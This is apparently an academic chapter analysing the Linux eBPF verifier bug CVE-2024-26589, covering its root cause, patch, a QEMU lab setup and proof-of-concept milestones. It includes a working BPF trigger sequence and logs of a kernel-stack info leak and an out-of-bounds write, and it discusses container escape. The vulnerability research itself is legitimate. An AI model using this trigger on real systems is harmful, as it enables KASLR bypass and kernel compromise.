\chapter{CVE-2024-26589}

\section{CVE Selection}
The choice of CVE-2024-26589 stems from the desire to complete the investigation into eBPF pointer arithmetic and boundary validation. While previous chapters focused on stack bounds calculation features (CVE-2023-52452), this chapter investigates a vulnerability derived from a purely logical omission within the verifier's core restriction mechanism (a missing \texttt{switch} statement case). It is also unique for exploring the \texttt{BPF\_PROG\_TYPE\_FLOW\_DISSECTOR} program type, demonstrating how distinct eBPF hooks expose different underlying kernel memory structures.

\section{Vulnerability Analysis}

\subsection{Root Cause}

The root cause of this vulnerability lies in the BPF verifier's enforcement of pointer arithmetic restrictions, specifically within the \texttt{adjust\_ptr\_min\_max\_vals()} function in \texttt{kernel/bpf/verifier.c}.
This function restricts which BPF pointer types can be subject to variable-offset addition. For example, \texttt{CONST\_PTR\_TO\_MAP} cannot be dynamically offset because map sizes differ.

The restriction relies on a \texttt{switch} statement:
\begin{lstlisting}[style=kernel]
switch (base_type(ptr_reg->type)) {
    case CONST_PTR_TO_MAP:
        /* smin_val represents the known value */
        if (known && smin_val == 0 && opcode == BPF_ADD)
            break;
        verbose(env, "R%d pointer arithmetic on %s prohibited\n", ...);
        return -EACCES;
    /* ... other pointer types ... */
}
\end{lstlisting}

However, the case for \texttt{PTR\_TO\_FLOW\_KEYS} was entirely missing. As a result, when a BPF program adds a variable-offset scalar to a \texttt{PTR\_TO\_FLOW\_KEYS}, the \texttt{switch} falls into the default path which inadvertently \textbf{allows} the arithmetic. Subsequential validation via \texttt{check\_flow\_keys\_access()} only validates constant offsets, creating a fatal blind spot.

\subsection{Exploiting the Missing Switch Case}

The bypass directly yields an \textbf{Out-Of-Bounds (OOB) Stack Access}:
\begin{enumerate}
    \item At runtime, the flow dissector hook allocates the \texttt{struct bpf\_flow\_keys} structure dynamically on the kernel stack during \texttt{bpf\_flow\_dissect()}.
    \item Because the verifier allowed variable offset arithmetic, the pointer can arbitrarily shift forward.
    \item Reading or writing to the offset pointer results in arbitrary Read/Write of the caller kernel stack memory beyond the original \texttt{flow\_keys} fields.
\end{enumerate}

\textbf{Trigger Conditions:}
The bypassed check enables corrupting the flow keys pointer locally:
\begin{lstlisting}[style=kernel]
// R6 = ctx
BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 144), // R7 = flow_keys

// Create a variable offset [0, 512]
BPF_MOV64_IMM(BPF_REG_8, 512),
BPF_ALU64_IMM(BPF_DIV, BPF_REG_8, 1), // Div disables verifier const tracking
BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 512), // Bound maximum range

// Variable addition on PTR_TO_FLOW_KEYS
BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8), // OVERFLOW happens here!

// R0 = *(u64*)(R7) --> Reads the caller's kernel stack structure
BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),
\end{lstlisting}

\subsection{Patch Details}

The formal resolution trivially incorporates the missing verification restriction block inside \texttt{adjust\_\allowbreak ptr\_\allowbreak min\_\allowbreak max\_\allowbreak vals()}:
\begin{lstlisting}[style=kernel]
	case PTR_TO_FLOW_KEYS:
		if (known)
			break;
		fallthrough;
\end{lstlisting}
The patch mandates absolute bounds resolution, enforcing \texttt{fallthrough} rules yielding safety-stop rejections to any variable-offset patterns against \texttt{flow\_keys}.

\begin{table}[H]
\centering
\begin{tabular}{@{}ll@{}}
\toprule
\textbf{Kernel Branch} & \textbf{Fixed Version} \\
\midrule
6.7.x & 6.7.6 \\
6.6.x & 6.6.18 \\
6.1.x & 6.1.79 \\
5.15.x & 5.15.149 \\
5.10.x & 5.10.210 \\
\bottomrule
\end{tabular}
\caption{Backport versions for CVE-2024-26589}
\end{table}

%% ═══════════════════════════════════════════════════════
\section{Environment Setup}

The environment strictly adheres to the one used in the previous CVEs.

\begin{table}[H]
\centering
\begin{tabular}{@{}ll@{}}
\toprule
\textbf{Component} & \textbf{Details} \\
\midrule
Environment & QEMU/KVM virtual machine \\
Kernel Version & 6.7.1 (vulnerable, patched in 6.7.6) \\
Root Filesystem & Buildroot 2024.11.4 (\texttt{qemu\_x86\_64\_defconfig}) \\
Trigger Path & `bpf()` syscall \texttt{BPF\_PROG\_TEST\_RUN} command \\
\bottomrule
\end{tabular}
\caption{Test environment for CVE-2024-26589}
\end{table}

%% ═══════════════════════════════════════════════════════
\section{Proof of Concept (PoC)}

\subsection{Milestone 1: Verifier Bypass Demonstration}

\textbf{Objective}: Prove the absence of the pointer restriction.

\textbf{Approach}: The \texttt{milestone1} executable loads two distinct \texttt{BPF\_PROG\_TYPE\_FLOW\_DISSECTOR} programs: a control and an exploit pattern. The control attempts a safe read, while the exploit attempts the unregistered division-based variable arithmetic mask pattern.

\textbf{Result}:
\begin{lstlisting}[style=log]
Test 1 (constant offset):   ACCEPTED (expected)
Test 2 (variable [0,1024]): ACCEPTED (CVE-2024-26589 confirmed!)
\end{lstlisting}
The verifier flawlessly processes the variable arithmetic branch, confirming the missing \texttt{switch} block on the targeted kernel version.

%% ═══════════════════════════════════════════════════════
\subsection{Milestone 2 \& 3: Extrapolating the OOB Read (Info Leak)}

\textbf{Objective}: Dynamically read memory contiguous to the \texttt{flow\_keys} structure. 

\textbf{Approach}: Using the \texttt{bpf()} syscall macro \texttt{BPF\_PROG\_TEST\_RUN}, the VM injects a test payload forcing the kernel into executing the BPF payload inside the context of \texttt{bpf\_flow\_dissect()}. The verifier is iteratively forced to evaluate offsets (\texttt{0}, \texttt{8}, ..., \texttt{384}), returning 8-byte chunks extracted towards higher kernel addresses using BPF array map communication channels to prevent 32-bit \texttt{r0} trimming.

\textbf{Results}:
\begin{lstlisting}[style=log,caption={Milestones stack scanning}]
  Kernel Stack Memory Scan via OOB Read
  [+   0]  0x00000000000e000e  (data)
  [+  64]  0xffffc900002f7f20  <- KERNEL POINTER (KASLR leak!)
  [+ 128]  0x0000000000000090  (small value)
  [+ 256]  0x0000000000000000  (zero)
  [+ 384]  0xffffffff81d86841  <- KERNEL POINTER (KASLR leak!)
\end{lstlisting}

This demonstrates a perfect Kernel info leak primitive capable of fetching return pointers from the calling functional boundaries seamlessly and effectively extracting \texttt{KASLR} entropy layouts.

%% ═══════════════════════════════════════════════════════
\subsection{Milestone 4: The Out-Of-Bounds Write}

\textbf{Objective}: Provide complete system manipulation capability with an OOB memory write.

\textbf{Approach}: Standard memory store operations (\texttt{BPF\_ST\_MEM}) do not incur verifier penalties on recognized structure targets like \texttt{flow\_keys}. I implemented a payload writing the 32-bit sequence \texttt{0x41414141} randomly along the extracted stack. 

\textbf{Results}:
\begin{lstlisting}[style=log]
[*] Test C: OOB Write...
[+] OOB write executed (retval=0). Kernel stack corrupted!
[+] OOB WRITE SUCCEEDED - marker written to kernel stack
\end{lstlisting}

By corrupting local memory variables in the caller sequence, we achieved standard stack corruption principles within Ring-0 environments.

%% ═══════════════════════════════════════════════════════
\section{Conclusion}

\subsection{Exploitation Impact Analysis}

The implementation successfully developed absolute \texttt{Read} and \texttt{Write} bounds within kernel execution threads. 

\textbf{Privilege Implication} - A significant attribute of CVE-2024-26589 is its requirement for the \texttt{BPF\_\allowbreak PROG\_\allowbreak TYPE\_\allowbreak FLOW\_\allowbreak DISSECTOR} attachment type. The execution inherently demands \texttt{CAP\_\allowbreak NET\_\allowbreak ADMIN} capabilities.
Unlike \texttt{SOCKET\_FILTER} programs, unprivileged users intrinsically cannot operate this hook type even in loosely configured machines.

Therefore, the exploit model transforms from a straight Local Privilege Escalation (Unprivileged to Root) into \textbf{Lateral Escape boundaries}:
\begin{itemize}
    \item \textbf{Container Escapes}: Containers loosely assigned \texttt{CAP\_NET\_ADMIN} capabilities (necessary for network router applications) afford the attacker means to manipulate the Host kernel structure entirely, tearing out of namespace isolation formats.
    \item \textbf{Lateral Access}: Bypassing networking limitation capabilities into the execution of arbitrary kernel space codes via the Return-Oriented Programming chain built on the target function's returning addresses.
\end{itemize}
